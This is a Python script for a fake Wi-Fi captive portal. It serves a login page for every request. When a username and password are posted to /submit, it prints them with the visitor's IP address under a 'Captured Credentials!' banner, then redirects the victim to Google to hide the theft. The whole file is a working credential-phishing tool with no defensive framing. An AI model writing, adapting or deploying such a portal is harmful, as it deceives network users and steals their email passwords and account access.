from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse
import os
import sys

server_address = ("127.0.0.1", 8080)

class InitCaptivePortal(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            if(self.path != "/login.html"):
                #self.send_error(503, "Please login to have access to Wi-Fi Network")
                self.path = "login.html"

            elif(self.path == "/submit"):
                self.send_error(404, "File Not Found")

            if(self.path.endswith(".html")):
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()

            with open("login.html", "rb") as file:
                self.wfile.write(file.read())

        except IOError:
            self.send_error(404, f"File Not Found: {self.path}")

    def do_POST(self):
        try:
            if(self.path == "/submit"):  #detect HTML for credentials
                content_length = int(self.headers["Content-length"])
                request_read = self.rfile.read(content_length).decode("utf-8") # read all POST request
                request_data = urllib.parse.parse_qs(request_read) # put strings in dictionary

                username = request_data.get("username", [""])[0]
                password = request_data.get("password", [""])[0]
                ip_address = self.client_address[0]

                captured = (f'''

                \033[1;37;45mCaptured Credentials!\033[m
                \033[1;32mIP Address\033[m...........: {ip_address}
                \033[1;32mE-mail\033[m...........: {username}
                \033[1;32mPassword\033[m...........: {password}

                ''')

                print(captured)

                self.send_response(302) # found
                self.send_header("Location", "https://www.google.com")
                self.end_headers()

            else:
                self.send_error(404, f"Resource Not Found: {self.path}")

        except Exception as err:
             self.send_error(500, f"Internal Error: {err}")

if __name__ == "__main__":
    if(not os.path.exists("login.html")):
        print("\033[1;31m[!] login.html Not Found\033[m")
        sys.exit()

    try:
        httpd = HTTPServer(server_address, InitCaptivePortal)
        print(f"\033[1;32m[*] Web Server Started:\033[m {server_address}\n")
        print(f"                  \033[30;47mAwaiting capture\033[m\n")
        httpd.serve_forever()  # persistence

    except KeyboardInterrupt:
        print("\033[1;31m[!] Ctrl + C interrupt\033[m")
        httpd.server_close()
